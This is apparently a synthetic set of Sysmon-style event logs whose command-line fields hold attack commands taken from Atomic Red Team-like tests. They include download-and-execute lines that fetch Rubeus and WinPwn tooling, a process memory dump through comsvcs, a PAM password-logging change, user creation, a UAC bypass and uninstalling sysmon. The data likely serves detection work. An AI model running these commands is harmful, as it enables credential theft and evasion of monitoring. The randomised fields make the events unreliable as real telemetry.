    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-49.rodriguez.com",
        "User": "grayjoel",
        "ProcessID": 6369,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"#{msbuildpath}\\\\#{msbuildname} \\\"#{filename}\\\"\\n\",",
        "LogonID": 304908,
        "LogonGuid": "cc1ea23e-1d55-4daf-8dac-013fb8c97bfc",
        "SourceProcessID": 2915,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\clearly..exe",
        "DestinationProcessID": 7564,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\two..dll",
        "UtcTime": "2024-05-17T01:36:51.861586Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-52.cohen-mack.net",
        "User": "andersonmichelle",
        "ProcessID": 9777,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')\\nInvoke-Rubeus -Command \\\"asreproast /format:hashcat /nowrap\\\"\",",
        "LogonID": 514853,
        "LogonGuid": "323a8bb8-1a90-456e-b757-fc7c9577dd43",
        "SourceProcessID": 3431,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\manage..exe",
        "DestinationProcessID": 5793,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\shake..dll",
        "UtcTime": "2024-05-17T01:36:51.861586Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-13.adams-montgomery.info",
        "User": "thomassimmons",
        "ProcessID": 6686,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"net user #{user_account} #{new_user_password} /add\\nnet.exe user #{user_account} #{new_password}\\n\",",
        "LogonID": 719953,
        "LogonGuid": "714c64bd-7901-416e-9d6f-af83d4cbbec5",
        "SourceProcessID": 3702,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\simply..dll",
        "DestinationProcessID": 3652,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\several..exe",
        "UtcTime": "2024-05-17T01:36:51.862586Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-70.butler.com",
        "User": "teresabrady",
        "ProcessID": 6721,
        "ProcessName": "malware.exe",
        "CommandLine": "\"certreq.exe -Post -config #{remote_file} c:\\\\windows\\\\win.ini #{local_path}\",",
        "LogonID": 525932,
        "LogonGuid": "2d1cefe0-13fc-4e70-a625-645747bb08b1",
        "SourceProcessID": 9611,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\near..dll",
        "DestinationProcessID": 1789,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\kind..exe",
        "UtcTime": "2024-05-17T01:36:51.862586Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-32.gomez.com",
        "User": "fordrobert",
        "ProcessID": 1241,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"LD_PRELOAD=#{path_to_shared_library} ls\\n\",",
        "LogonID": 874602,
        "LogonGuid": "fbae3165-b866-4654-b324-0a2d8d1915f2",
        "SourceProcessID": 1736,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\state..dll",
        "DestinationProcessID": 1701,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\material..dll",
        "UtcTime": "2024-05-17T01:36:51.862586Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-92.roy-hughes.biz",
        "User": "loriburton",
        "ProcessID": 1311,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"query user\\n\",",
        "LogonID": 306070,
        "LogonGuid": "ec36e627-1045-4bfa-a1d7-ec210c72cf49",
        "SourceProcessID": 2012,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\painting..dll",
        "DestinationProcessID": 7364,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\boy..exe",
        "UtcTime": "2024-05-17T01:36:51.862586Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-20.curtis-miller.com",
        "User": "rlewis",
        "ProcessID": 1788,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nGeneralrecon -consoleoutput -noninteractive\",",
        "LogonID": 321021,
        "LogonGuid": "70955362-b64f-4154-a6a0-569edcf5d180",
        "SourceProcessID": 8928,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\election..exe",
        "DestinationProcessID": 2291,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\step..exe",
        "UtcTime": "2024-05-17T01:36:51.862586Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-50.espinoza.info",
        "User": "nsimmons",
        "ProcessID": 5816,
        "ProcessName": "malware.exe",
        "CommandLine": "\"#{crackmapexec_exe} #{domain} -u #{user_name} -H #{ntlm} -x #{command}\\n\",",
        "LogonID": 361770,
        "LogonGuid": "a3720b41-3465-41da-9e10-a85de916c384",
        "SourceProcessID": 2119,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\strategy..exe",
        "DestinationProcessID": 2916,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\risk..exe",
        "UtcTime": "2024-05-17T01:36:51.863586Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-61.reeves.com",
        "User": "vhenderson",
        "ProcessID": 4263,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"$extList = #{extension_id}\\nforeach ($extension in $extList) {\\n  New-Item -Path HKLM:\\\\Software\\\\Wow6432Node\\\\Google\\\\Chrome\\\\Extensions\\\\$extension -Force\\n  New-ItemProperty -Path \\\"HKLM:\\\\Software\\\\Wow6432Node\\\\Google\\\\Chrome\\\\Extensions\\\\$extension\\\" -Name \\\"update_url\\\" -Value \\\"https://clients2.google.com/service/update2/crx\\\" -PropertyType \\\"String\\\" -Force}\\nStart chrome\\nStart-Sleep -Seconds 30\\nStop-Process -Name \\\"chrome\\\"\\n\",",
        "LogonID": 708589,
        "LogonGuid": "571d0870-fd4a-48fa-85eb-20a82af95e77",
        "SourceProcessID": 8522,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\color..exe",
        "DestinationProcessID": 6751,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\serve..exe",
        "UtcTime": "2024-05-17T01:36:51.863586Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-79.bruce.com",
        "User": "darlenemartinez",
        "ProcessID": 9863,
        "ProcessName": "malware.exe",
        "CommandLine": "\"REG QUERY HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Cryptography /v MachineGuid\\n\",",
        "LogonID": 746707,
        "LogonGuid": "a2856709-2a55-4e52-9ba1-ce39a89d1fb9",
        "SourceProcessID": 2966,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\task..dll",
        "DestinationProcessID": 6629,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\thousand..exe",
        "UtcTime": "2024-05-17T01:36:51.863586Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-31.harrell.org",
        "User": "rhale",
        "ProcessID": 6966,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"reg query HKEY_LOCAL_MACHINE\\\\HARDWARE\\\\DESCRIPTION\\\\System /v SystemBiosVersion\\nreg query HKEY_LOCAL_MACHINE\\\\HARDWARE\\\\DESCRIPTION\\\\System /v VideoBiosVersion\\n\",",
        "LogonID": 910139,
        "LogonGuid": "479796a5-022b-47d6-8b61-70424c863997",
        "SourceProcessID": 5826,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\close..exe",
        "DestinationProcessID": 2012,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\movement..dll",
        "UtcTime": "2024-05-17T01:36:51.864587Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-09.combs.com",
        "User": "thomas71",
        "ProcessID": 2051,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"net user #{user_account} #{new_user_password} /add\\nnet.exe user #{user_account} #{new_password}\\n\",",
        "LogonID": 725057,
        "LogonGuid": "f7f3de62-d581-4d0d-981b-9f42f68ad901",
        "SourceProcessID": 8803,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\next..exe",
        "DestinationProcessID": 4482,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\Mr..exe",
        "UtcTime": "2024-05-17T01:36:51.864587Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-16.webster-moore.com",
        "User": "stephen34",
        "ProcessID": 6471,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nsensitivefiles -noninteractive -consoleoutput\",",
        "LogonID": 228753,
        "LogonGuid": "ab29c276-f732-415e-ad92-c2a0468341ca",
        "SourceProcessID": 4464,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\computer..dll",
        "DestinationProcessID": 5242,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\course..dll",
        "UtcTime": "2024-05-17T01:36:51.864587Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-06.gonzalez.com",
        "User": "ryanhughes",
        "ProcessID": 7072,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"wmic group get name\\n\",",
        "LogonID": 351939,
        "LogonGuid": "7e3515de-7b28-426f-9980-4694817d853f",
        "SourceProcessID": 4964,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\street..exe",
        "DestinationProcessID": 2567,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\wait..dll",
        "UtcTime": "2024-05-17T01:36:51.865096Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-75.house.com",
        "User": "ewilson",
        "ProcessID": 2110,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\\n. \\\"#{test_harness}\\\"\\n\\n$InstallerAssemblyDir = \\\"#{assembly_dir}\\\"\\n$InstallerAssemblyFileName = \\\"#{assembly_filename}\\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\\"/logfile= /logtoconsole=false `\\\"$InstallerAssemblyFullPath`\\\"\\\"\\n$ExpectedOutput = 'Constructor_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\\"\\nInstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\\"@\\n}\\n\",",
        "LogonID": 997371,
        "LogonGuid": "87a57763-8575-4764-a142-a59134de76a5",
        "SourceProcessID": 4440,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\easy..exe",
        "DestinationProcessID": 4825,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\event..dll",
        "UtcTime": "2024-05-17T01:36:51.865096Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-01.ayala.info",
        "User": "barbarahardy",
        "ProcessID": 2281,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"$credFile = \\\"#{cred_file}\\\"\\nif (Test-Path $credFile) {\\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\\n    if($cred.GetNetworkCredential().Password -eq \\\"#{new_password}\\\"){\\n      Write-Host -ForegroundColor Yellow \\\"The new password is the same as the password stored in the credential file. Please specify a different new password.\\\"; exit -1\\n    }\\n    try {\\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\\n    }\\n    catch { \\n        $_.Exception\\n        $errCode = $_.Exception.ErrorCode\\n        Write-Host \\\"Error code: $errCode\\\"\\n        if ($errCode -eq 86) {\\n            Write-Host -ForegroundColor Yellow \\\"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\\\"\\n            Remove-Item $credFile\\n        }\\n        exit $errCode\\n    }\\n    Write-Host -ForegroundColor Cyan \\\"Successfully changed the password to #{new_password}\\\"\\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \\\"#{new_password}\\\" -AsPlainText -Force))\\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\\n}\\nelse {\\n    Write-Host -ForegroundColor Yellow \\\"You must store the password of the current user by running the prerequisite commands first\\\"\\n}\\n\",",
        "LogonID": 570308,
        "LogonGuid": "dfa71cba-acd5-44fc-a8f6-237781941aa0",
        "SourceProcessID": 9882,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\management..dll",
        "DestinationProcessID": 4947,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\language..exe",
        "UtcTime": "2024-05-17T01:36:51.865096Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-39.smith.com",
        "User": "jenkinswilliam",
        "ProcessID": 1115,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"username=$(id -u -n) && lsof -u $username\\n\",",
        "LogonID": 153635,
        "LogonGuid": "b5bd4e5d-64a1-425a-9429-1272946b9f9c",
        "SourceProcessID": 6376,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\until..exe",
        "DestinationProcessID": 2866,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\raise..dll",
        "UtcTime": "2024-05-17T01:36:51.865096Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-96.ramos.info",
        "User": "jonesmatthew",
        "ProcessID": 9515,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"Powershell.exe \\\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\\\Windows\\\\System32\\\\cmd.exe'\\\"\\n\",",
        "LogonID": 439355,
        "LogonGuid": "7559fde0-5c71-45ba-bb26-a0617f06734b",
        "SourceProcessID": 9714,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\former..dll",
        "DestinationProcessID": 4636,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\PM..exe",
        "UtcTime": "2024-05-17T01:36:51.865096Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-24.cobb.net",
        "User": "paul26",
        "ProcessID": 6634,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"echo '#\\\\!/bin/sh' > #{rc_service_path}/#{rc_service_file}\\necho ' ' >> #{rc_service_path}/#{rc_service_file}\\necho '#' >> #{rc_service_path}/#{rc_service_file}\\necho '# PROVIDE: art-test' >> #{rc_service_path}/#{rc_service_file}\\necho '# REQUIRE: LOGIN' >> #{rc_service_path}/#{rc_service_file}\\necho '# KEYWORD: shutdown' >> #{rc_service_path}/#{rc_service_file}\\necho ' ' >> #{rc_service_path}/#{rc_service_file}\\necho '. /etc/rc.subr' >> #{rc_service_path}/#{rc_service_file}\\necho ' ' >> #{rc_service_path}/#{rc_service_file}\\necho 'name=\\\"art_test\\\"' >> #{rc_service_path}/#{rc_service_file}\\necho 'rcvar=art_test_enable' >> #{rc_service_path}/#{rc_service_file}\\necho 'load_rc_config ${name}' >> #{rc_service_path}/#{rc_service_file}\\necho 'command=\\\"/usr/bin/touch\\\"' >> #{rc_service_path}/#{rc_service_file}\\necho 'start_cmd=\\\"art_test_start\\\"' >> #{rc_service_path}/#{rc_service_file}\\necho '' >> #{rc_service_path}/#{rc_service_file}\\necho 'art_test_start()' >> #{rc_service_path}/#{rc_service_file}     \\necho '{' >> #{rc_service_path}/#{rc_service_file}\\necho '  ${command} /tmp/art-test.marker' >> #{rc_service_path}/#{rc_service_file}\\necho '}' >> #{rc_service_path}/#{rc_service_file}\\necho ' ' >> #{rc_service_path}/#{rc_service_file}     \\necho 'run_rc_command \\\"$1\\\"' >> #{rc_service_path}/#{rc_service_file}\\nchmod +x #{rc_service_path}/#{rc_service_file}\\nservice art-test enable\\nservice art-test start\\n\",",
        "LogonID": 667104,
        "LogonGuid": "5d679067-b1d4-4a36-a066-648a205bbfc9",
        "SourceProcessID": 6911,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\worker..dll",
        "DestinationProcessID": 6373,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\study..dll",
        "UtcTime": "2024-05-17T01:36:51.866104Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-01.shelton-watson.com",
        "User": "carpenterthomas",
        "ProcessID": 8532,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"timeout --preserve-status #{timeout} whois -h #{remote_host} -p #{remote_port} \\\"#{query}\\\" > #{output_file}\\n\",",
        "LogonID": 733887,
        "LogonGuid": "6a27b61a-7d97-4a3f-b8bd-fc55423ec671",
        "SourceProcessID": 2045,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\she..dll",
        "DestinationProcessID": 6456,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\focus..exe",
        "UtcTime": "2024-05-17T01:36:51.866104Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-70.ray-gray.com",
        "User": "anna47",
        "ProcessID": 3805,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi;\\nif sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi;\\nsudo touch /tmp/password-auth.bk\\nsudo touch /tmp/system-auth.bk sudo echo \\\"session    required    pam_tty_audit.so\\nenable=* log_password\\\" >> /etc/pam.d/password-auth sudo echo \\\"session    required    pam_tty_audit.so\\nenable=* log_password\\\" >> /etc/pam.d/system-auth\\n\",",
        "LogonID": 848614,
        "LogonGuid": "c7605ab8-321a-4aa0-89f4-a8e0b873c1bf",
        "SourceProcessID": 4579,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\continue..dll",
        "DestinationProcessID": 8132,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\thing..exe",
        "UtcTime": "2024-05-17T01:36:51.866104Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-85.brandt.com",
        "User": "robertsapril",
        "ProcessID": 4301,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"set DOTNET_STARTUP_HOOKS=\\\"#{preloader_dll}\\\"\\ndotnet -h > nul\\necho.\\n\",",
        "LogonID": 614541,
        "LogonGuid": "4788230b-7633-4e17-aeae-c86f81d73e2a",
        "SourceProcessID": 6857,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\deep..dll",
        "DestinationProcessID": 3357,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\catch..dll",
        "UtcTime": "2024-05-17T01:36:51.866104Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-84.clarke-dickson.net",
        "User": "dustin95",
        "ProcessID": 6891,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)\\nif($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }\\nC:\\\\Windows\\\\System32\\\\rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump $id $env:TEMP\\\\svchost-exe.dmp full\\n\",",
        "LogonID": 463733,
        "LogonGuid": "4d69db4f-6454-4f7b-b02e-2d52f1983c3e",
        "SourceProcessID": 2418,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\first..dll",
        "DestinationProcessID": 4193,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\establish..exe",
        "UtcTime": "2024-05-17T01:36:51.866104Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-81.ingram.com",
        "User": "jacobrobbins",
        "ProcessID": 5877,
        "ProcessName": "nc.exe",
        "CommandLine": "\"$credFile = \\\"#{cred_file}\\\"\\nif (Test-Path $credFile) {\\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\\n    if($cred.GetNetworkCredential().Password -eq \\\"#{new_password}\\\"){\\n      Write-Host -ForegroundColor Yellow \\\"The new password is the same as the password stored in the credential file. Please specify a different new password.\\\"; exit -1\\n    }\\n    try {\\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\\n    }\\n    catch { \\n        $_.Exception\\n        $errCode = $_.Exception.ErrorCode\\n        Write-Host \\\"Error code: $errCode\\\"\\n        if ($errCode -eq 86) {\\n            Write-Host -ForegroundColor Yellow \\\"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\\\"\\n            Remove-Item $credFile\\n        }\\n        exit $errCode\\n    }\\n    Write-Host -ForegroundColor Cyan \\\"Successfully changed the password to #{new_password}\\\"\\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \\\"#{new_password}\\\" -AsPlainText -Force))\\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\\n}\\nelse {\\n    Write-Host -ForegroundColor Yellow \\\"You must store the password of the current user by running the prerequisite commands first\\\"\\n}\\n\",",
        "LogonID": 477009,
        "LogonGuid": "5be1e153-ab63-4bee-8631-f0872addb477",
        "SourceProcessID": 8427,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\control..exe",
        "DestinationProcessID": 7077,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\growth..dll",
        "UtcTime": "2024-05-17T01:36:51.867101Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-99.norman-lowery.com",
        "User": "scotthodges",
        "ProcessID": 2424,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"net user #{guest_user} /active:yes\\n\",",
        "LogonID": 760317,
        "LogonGuid": "ba0b10b9-944d-46db-ae96-e8c631819cb1",
        "SourceProcessID": 2880,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\by..dll",
        "DestinationProcessID": 5483,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\religious..dll",
        "UtcTime": "2024-05-17T01:36:51.867101Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-53.taylor.net",
        "User": "taylorsuarez",
        "ProcessID": 6484,
        "ProcessName": "nc.exe",
        "CommandLine": "\"tcpdump -c 5 -nnni #{interface}\\ntshark -c 5 -i #{interface}\\n\",",
        "LogonID": 362201,
        "LogonGuid": "f348c5c5-8b07-4bc5-b1a9-8dc81ebc5734",
        "SourceProcessID": 3641,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\determine..dll",
        "DestinationProcessID": 2378,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\sea..dll",
        "UtcTime": "2024-05-17T01:36:51.867101Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-44.burton.net",
        "User": "anthony08",
        "ProcessID": 8577,
        "ProcessName": "nc.exe",
        "CommandLine": "\"cmstp.exe /s \\\"#{inf_file_uac}\\\" /au\\n\",",
        "LogonID": 921217,
        "LogonGuid": "456d42a5-0064-4fc8-8b35-fcf8102ceed0",
        "SourceProcessID": 8282,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\crime..dll",
        "DestinationProcessID": 2565,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\majority..exe",
        "UtcTime": "2024-05-17T01:36:51.867101Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-73.davis-lynch.com",
        "User": "monica27",
        "ProcessID": 9206,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"sudo #{exe_path}\\nkextstat 2>/dev/null | grep SoftRAID\\nsudo kextunload /Library/Extensions/SoftRAID.kext\\n\",",
        "LogonID": 619732,
        "LogonGuid": "f8c9ea10-395c-4fc5-8469-4a75af73ca70",
        "SourceProcessID": 7871,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\seem..dll",
        "DestinationProcessID": 6615,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\side..exe",
        "UtcTime": "2024-05-17T01:36:51.867101Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-60.harrell.org",
        "User": "ucollins",
        "ProcessID": 9828,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"sysmon -u\\n\",",
        "LogonID": 734325,
        "LogonGuid": "581f1629-6505-473d-9570-cc6307191f7f",
        "SourceProcessID": 6238,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\system..exe",
        "DestinationProcessID": 2985,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\force..dll",
        "UtcTime": "2024-05-17T01:36:51.868101Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-30.howe.com",
        "User": "hermanjulie",
        "ProcessID": 2716,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\ninv-phantom -consoleoutput -noninteractive  \",",
        "LogonID": 440551,
        "LogonGuid": "c6335e2a-3664-472b-b50e-d4c6731e32ad",
        "SourceProcessID": 6739,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\ago..exe",
        "DestinationProcessID": 7676,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\weight..dll",
        "UtcTime": "2024-05-17T01:36:51.868101Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-44.lopez.biz",
        "User": "lewislisa",
        "ProcessID": 4885,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"reg add \\\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\" /v ProxyEnable /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 290184,
        "LogonGuid": "a608a15d-0598-4c69-a646-fca3f2179bbf",
        "SourceProcessID": 8386,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\role..dll",
        "DestinationProcessID": 5587,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\power..dll",
        "UtcTime": "2024-05-17T01:36:51.868101Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-32.bailey.info",
        "User": "pmiller",
        "ProcessID": 1207,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"sudo #{program_path} -f -i #{ifname} -t 3\\n\",",
        "LogonID": 974462,
        "LogonGuid": "c3c82c52-6624-403a-9245-0f6b694a8302",
        "SourceProcessID": 1276,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\program..dll",
        "DestinationProcessID": 3102,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\check..exe",
        "UtcTime": "2024-05-17T01:36:51.868101Z"
    },
    {
